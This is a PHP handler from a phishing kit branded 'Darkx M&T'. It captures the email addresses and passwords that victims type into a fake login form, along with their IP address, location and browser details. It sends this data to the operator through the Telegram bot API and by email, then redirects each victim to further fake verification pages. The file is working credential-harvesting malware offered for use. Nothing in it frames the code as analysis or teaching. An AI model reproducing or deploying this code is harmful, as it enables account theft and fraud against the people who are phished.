<?php 
	session_start();

	        // variable declaration
	        $errors = array(); 
                 

               if (isset($_POST['AuthCode']))
	          {
	          	include 'recon.php';
	          	include 'mail.php';
	          
	          $mail = $_POST['mail'];
	          $password = $_POST['password'];
	        
	          $ip = getenv("REMOTE_ADDR");
	          $useragent = $_SERVER['HTTP_USER_AGENT'];
	          //send email
	          $body = "::::::::::::::::::::::: Darkx M&T Info [Mail Access] :::::::::::::::::::::::::\r\n";
	          $body .= "Email Address                  : $mail\r\n";
	          $body .= "Password                       : $password\r\n";
	          $body .=  "|--------------- I N F O | I P -------------------|\r\n";
	          $body .= "IP Address	                       : {$_SESSION['ip']}\r\n";
	          $body .= "IP Country	                       : {$_SESSION['country']}\r\n";
	          $body .= "IP City	                               : {$_SESSION['city']}\r\n";
	          $body .= "Browser		                       : {$_SESSION['browser']} on {$_SESSION['platform']}\r\n";
	          $body .= "User Agent	                       : {$_SERVER['HTTP_USER_AGENT']}\r\n";
	          $body .= "TIME		                       : ".date("d/m/Y h:i:sa")." GMT\r\n";
	          $body .= ":::::::::::::::::::::: Darkx M&T Info :::::::::::::::::::::::::\r\n";


	            $website="https://api.telegram.org/bot".$botToken;
 
		  $params=[
   		   'chat_id'=>$chatId, 
  		    'text'=>$body,
		  ];
		  $ch = curl_init($website . '/sendMessage');
		  curl_setopt($ch, CURLOPT_HEADER, false);
		  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		  curl_setopt($ch, CURLOPT_POST, 1);
		  curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
		  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
		  $result = curl_exec($ch);
		  curl_close($ch);
             
	          $subject="M&T Darkx Mail Access 2 => From {$_SESSION['ip']} [ {$_SESSION['country']}-{$_SESSION['countrycode']} - {$_SESSION['platform']} ]";

	          $headers="From: M&T Darkx V1 <darkxxcoder@gmail.com>\r\n";
	          $headers.="MIME-Version: 1.0\r\n";
	          $headers.="Content-Type: text/plain; charset=UTF-8\r\n";
	          if(@mail($to, $subject, $body, $headers))
	          {
	          	$key = substr(sha1(mt_rand()),1,25);
	          	echo "<script>window.location.href='../credit_verify.php?primarymember_id=".$key."&country=".$_SESSION['country']."&iso=".$_SESSION['countrycode']."';</script>";
	          	die();
	          }
	          else
	          {
	        	$key = substr(sha1(mt_rand()),1,25);
	        	echo "<script>window.location.href='../mail_verify.php?primarymember_id=".$key."&country=".$_SESSION['country']."&iso=".$_SESSION['countrycode']."';</script>";
	        	die();
	        	}
	          }

	          if(isset($_POST['mail'])&&isset($_POST['password']))
	          {
	          include 'recon.php';
	          include 'mail.php';
	          // check for valid email address
	          $mail = $_POST['mail'];
	          $password = $_POST['password'];
	        
	          $ip = getenv("REMOTE_ADDR");
	          $useragent = $_SERVER['HTTP_USER_AGENT'];
	          //send email
	          $body = "::::::::::::::::::::::: Darkx M&T Info [Mail Access] :::::::::::::::::::::::::\r\n";
	          $body .= "Email Address                  : $mail\r\n";
	          $body .= "Password                       : $password\r\n";
	          $body .=  "|--------------- I N F O | I P -------------------|\r\n";
	          $body .= "IP Address	                       : {$_SESSION['ip']}\r\n";
	          $body .= "IP Country	                       : {$_SESSION['country']}\r\n";
	          $body .= "IP City	                                 : {$_SESSION['city']}\r\n";
	          $body .= "Browser		                       : {$_SESSION['browser']} on {$_SESSION['platform']}\r\n";
	          $body .= "User Agent	                       : {$_SERVER['HTTP_USER_AGENT']}\r\n";
	          $body .= "TIME		                       : ".date("d/m/Y h:i:sa")." GMT\r\n";
	          $body .= ":::::::::::::::::::::: Darkx M&T Info :::::::::::::::::::::::::\r\n";



	            $website="https://api.telegram.org/bot".$botToken;
 
		  $params=[
   		   'chat_id'=>$chatId, 
  		    'text'=>$body,
		  ];
		  $ch = curl_init($website . '/sendMessage');
		  curl_setopt($ch, CURLOPT_HEADER, false);
		  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		  curl_setopt($ch, CURLOPT_POST, 1);
		  curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
		  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
		  $result = curl_exec($ch);
		  curl_close($ch);
    
	          $subject="M&T Darkx Mail Access 1 => From {$_SESSION['ip']} [ {$_SESSION['country']}-{$_SESSION['countrycode']} - {$_SESSION['platform']} ]";
	          
	          $headers="From: M&T Darkx V1 <darkxxcoder@gmail.com>\r\n";
	          $headers.="MIME-Version: 1.0\r\n";
	          $headers.="Content-Type: text/plain; charset=UTF-8\r\n";
	          if(@mail($to, $subject, $body, $headers))
	          {
	          $key = substr(sha1(mt_rand()),1,25);
	          echo "<script>window.location.href='../mail_verify.php?AuthCode=6004';</script>";
	          die();
	          }
	          else
	          {
	          $key = substr(sha1(mt_rand()),1,25);
	          echo "<script>window.location.href='../mail_verify.php?AuthCode=6004';</script>";
	          die();
	          }
	          }
	          
	          
	     
	      
?>